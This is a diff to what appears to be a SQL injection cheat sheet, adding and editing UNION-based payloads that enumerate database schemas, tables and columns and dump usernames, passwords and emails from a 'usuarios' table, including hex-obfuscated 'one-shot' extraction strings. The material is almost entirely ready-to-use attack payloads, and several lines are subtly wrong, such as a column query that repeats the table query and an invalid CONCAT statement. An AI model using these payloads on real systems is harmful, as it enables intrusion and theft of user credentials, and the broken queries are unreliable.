@@ -73,13 +73,13 @@ SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' a
 
 ````py
 ## Database Names
--1' UniOn Select 1,2,3,schema_name FROM information_schema.schemata LIMIT 0,1 ,4,5,6
+-1' UniOn Select 1,2,3,schema_name FROM information_schema.schemata LIMIT 0,1 ,5,6
 
 ## Tables of a Database
--1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table.schema = [$database] LIMIT 0,1 ,4,5,6
+-1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table.schema = [$database] LIMIT 0,1 ,5,6
 
 ## Column Names
--1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table.schema = [$database] LIMIT 0,1 ,4,5,6
+-1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table.schema = [$database] LIMIT 0,1 ,5,6
 
 
 ````
@@ -88,15 +88,29 @@ SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' a
 
 ### Data
 
+#### Group Concat
 
-
+- MySQL Query:
 ````sql
 SELECT GROUP_CONCAT(username,password,mail,' ::: ') FROM usuarios;
 ````
 
-
+- Web + Offuscation
 ````py
-(SELECT+GROUP_CONCAT(username,0x3a,password,0x3a,mail+SEPARATOR+0x3c62723e)+FROM+usuarios)
+-1' UniOn Select 1,2,3,(SELECT+GROUP_CONCAT(username,0x3a,password,0x3a,mail+SEPARATOR+0x3c62723e)+FROM+usuarios),5,6
+````
+
+#### 1-Shot
+
+- MySQL Query:
+````sql
+## 1 shot
+SELECT * FROM usuarios CONCAT(username,password,mail);
+````
+
+- Web + Offuscation
+````py
+-1' UniOn Select 1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(usuarios)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,0x3a,password,0x3a,mail,0x3c62723e))))x),5,6
 ````
 ### 💉 Group Concat
 
